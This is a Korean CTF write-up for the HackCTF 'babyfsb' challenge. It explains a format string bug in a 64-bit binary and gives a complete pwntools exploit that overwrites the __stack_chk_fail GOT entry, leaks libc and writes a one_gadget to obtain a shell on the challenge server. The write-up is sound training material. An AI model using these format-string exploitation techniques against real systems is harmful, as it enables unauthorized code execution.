---
title: "[HackCTF]babyfsb"
date: 2020-1-27
tags: [HackCTF]
categories: [HackCTF]
---

보호기법은 RELRO, Canary, NX가 걸려있다.

```
[*] '/vagrant/ctfs/babyfsb1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

메인에서 보면 buf라는 지역변수에 64만큼 입력받고 출력하는데 포맷스트링 버그가 터진다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-40h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("hello");
  read(0, &buf, 64uLL);
  printf(&buf, &buf);
  return 0;
}
```

Canary가 걸려있어서 __stack_chk_fail@got를 main으로 덮고 리턴 주소 leak해주고 다시 메인에서 one_gadget을 다시 덮어주고 Canary 건들이면 된다.

처음에 main_low로 넣는 이유는 __stack_chk_fail 함수가 전에 call된 적이 없어서 하위 2byte만 바꿔주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./babyfsb1')
#p = process('./babyfsb1')
p = remote('ctf.j0n9hyun.xyz',3032)
libc = e.libc
main = e.symbols['main'] # 0x00000000004006a6 4196006 
main_low = main & 0xffff
stack_chk_fail_got = e.got['__stack_chk_fail'] # 0x0000000000601020 6295584
offset = 6

# __stack_chk_fail@got -> main
payload = '%{}c'.format(main_low)
payload += '%8$hn'
payload += '%15$p' # __libc_start_main + 240
payload += p64(stack_chk_fail_got)
payload = payload.ljust(60,'A') # **stack smash detect** -> main
p.sendlineafter('hello\n',payload)

p.recvuntil('0x')
leak = int(p.recv(12),16)
log.info('__libc_start_main+240 : ' + hex(leak))
libc_base = leak - libc.symbols['__libc_start_main'] - 240
log.info('libc_base : ' + hex(libc_base))
#one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + 0x45216
log.info('one_gadget : ' + hex(one_gadget))

one_gadget_low = one_gadget & 0xffff
one_gadget_middle = (one_gadget >> 16) & 0xffff
one_gadget_high = (one_gadget >> 32) &0xffff

low = one_gadget_low

if one_gadget_middle > one_gadget_low:
    middle = one_gadget_middle - one_gadget_low
else:
    middle = 0x10000 + one_gadget_middle - one_gadget_low

if one_gadget_high > one_gadget_middle:
    high = one_gadget_high - one_gadget_middle
else:
    high = 0x10000 + one_gadget_high - one_gadget_middle

payload2 = '%{}c'.format(low) # 1
payload2 += '%11$hn'
payload2 += '%{}c'.format(middle) # 2
payload2 += '%12$hn'
payload2 += '%{}c'.format(high) # 3
payload2 += '%13$hn'
payload2 += 'A'*(8-(len(payload2)%8))
# print len(payload2)
payload2 += p64(stack_chk_fail_got) # 1
payload2 += p64(stack_chk_fail_got+2) # 2
payload2 += p64(stack_chk_fail_got+4) # 3
payload2 = payload2.ljust(60,'A')
p.sendlineafter('hello\n',payload2)

p.interactive()
```
